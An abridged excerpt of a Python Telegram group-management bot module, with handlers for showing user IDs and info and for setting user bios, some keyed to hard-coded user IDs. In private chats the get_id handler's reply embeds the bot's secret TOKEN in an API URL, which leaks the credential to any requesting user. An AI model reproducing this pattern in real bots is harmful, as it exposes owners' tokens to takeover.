...
from TGRobot import telethn as YoneTelethonClient, TIGERS, DRAGONS, DEMONS
...
def get_id(update: Update, context: CallbackContext):
    ...
    if user_id:
        ...
        if chat.type == "private":
            ...
            msg.reply_text(
                f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={chat.id}&user_id={user.id}'s id is <code>{user.id}</code>.",
...
def info(update: Update, context: CallbackContext):
    ...
    if user_id not in [bot.id, 777000, 1087968824]:
        ...
        text += f"\n\n<b>Health:</b> <code>{userhp['earnedhp']}/{userhp['totalhp']}</code>\n[<b>{make_bar(int(userhp['percentage']))} </b>{userhp['percentage']}%]"
    elif user_id in [1775659407, 1786263593]:
        text += f"\n\n <b>Well it does'nt matter...</b>"
...
def set_about_me(update: Update, context: CallbackContext):
    ...
    if message.reply_to_message:
        ...
        if repl_user_id in [bot.id, 777000, 1087968824, 1775659407] and (user_id in DEV_USERS):
    ...
    if len(info) == 2:
        if len(info[1]) < MAX_MESSAGE_LENGTH // 4:
            ...
            if user_id in [777000, 1087968824, 1775659407]:
...
def set_about_bio(update: Update, context: CallbackContext):
    ...
    if message.reply_to_message:
        ...
        if user_id in [777000, 1087968824, 1775659407] and sender_id not in DEV_USERS:
            message.reply_text("You are not authorised")
            return

        if user_id == bot.id and sender_id not in DEV_USERS:
            message.reply_text(
                "Erm... yeah, I only trust Public Safety Devil Hunters to set my bio."
            )
            return
